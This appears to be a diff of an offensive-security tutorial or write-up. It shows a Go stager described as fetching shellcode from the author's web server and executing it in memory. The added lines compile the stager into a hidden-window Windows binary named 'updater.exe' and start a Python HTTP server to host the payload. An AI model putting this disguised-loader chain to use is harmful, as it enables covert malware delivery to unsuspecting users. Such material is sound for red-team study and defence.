@@ -235,6 +235,14 @@ func main() {
 Ill then use this code as my stager, it will reach back to my webserver and load the shellcode into memory and execute it
 
 ```python
-
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o updater.exe stager.go
 ```
+
+Ill then compile it into `updater.exe`
+
+```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
 
